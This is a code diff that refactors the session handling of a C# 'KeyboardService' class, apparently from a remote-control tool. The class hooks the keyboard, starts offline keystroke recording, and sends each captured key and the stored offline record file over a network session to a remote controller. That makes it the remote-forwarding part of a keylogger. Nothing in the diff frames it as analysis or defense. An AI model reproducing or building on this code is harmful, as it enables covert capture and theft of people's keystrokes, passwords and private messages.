@@ -1,7 +1,7 @@
 ﻿using SiMay.Core;
 using SiMay.ModelBinder;
+using SiMay.Net.SessionProvider;
 using SiMay.ServiceCore.Attributes;
-using SiMay.Sockets.Tcp.Session;
 
 namespace SiMay.ServiceCore
 {
@@ -10,7 +10,7 @@ namespace SiMay.ServiceCore
     public class KeyboardService : ApplicationRemoteService
     {
         private Keyboard _keyboard;
-        public override void SessionInited(TcpSocketSaeaSession session)
+        public override void SessionInited(SessionProviderContext session)
         {
 
         }
@@ -26,18 +26,18 @@ namespace SiMay.ServiceCore
         }
 
         [PacketHandler(MessageHead.S_KEYBOARD_OFFLINE)]
-        public void ActionOffLineRecords(TcpSocketSaeaSession session)
+        public void ActionOffLineRecords(SessionProviderContext session)
             => _keyboard.StartOfflineRecords();
 
         [PacketHandler(MessageHead.S_KEYBOARD_GET_OFFLINEFILE)]
-        public void SendOffLineRecord(TcpSocketSaeaSession session)
+        public void SendOffLineRecord(SessionProviderContext session)
         {
-            SendTo(CurrentSession, MessageHead.C_KEYBOARD_OFFLINEFILE,
+            CurrentSession.SendTo(MessageHead.C_KEYBOARD_OFFLINEFILE,
                 _keyboard.GetOfflineRecord());
         }
 
         [PacketHandler(MessageHead.S_KEYBOARD_ONOPEN)]
-        public void Init(TcpSocketSaeaSession session)
+        public void Init(SessionProviderContext session)
         {
             _keyboard = Keyboard.GetKeyboardInstance();
             _keyboard.NotiyProc += new Keyboard.KeyboardNotiyHandler(_keyboard_NotiyProc);
@@ -56,7 +56,7 @@ namespace SiMay.ServiceCore
                     break;
 
                 case Keyboard.KeyboardHookEvent.Data:
-                    SendTo(CurrentSession, MessageHead.C_KEYBOARD_DATA, key);
+                    CurrentSession.SendTo(MessageHead.C_KEYBOARD_DATA, key);
                     break;
             }
         }
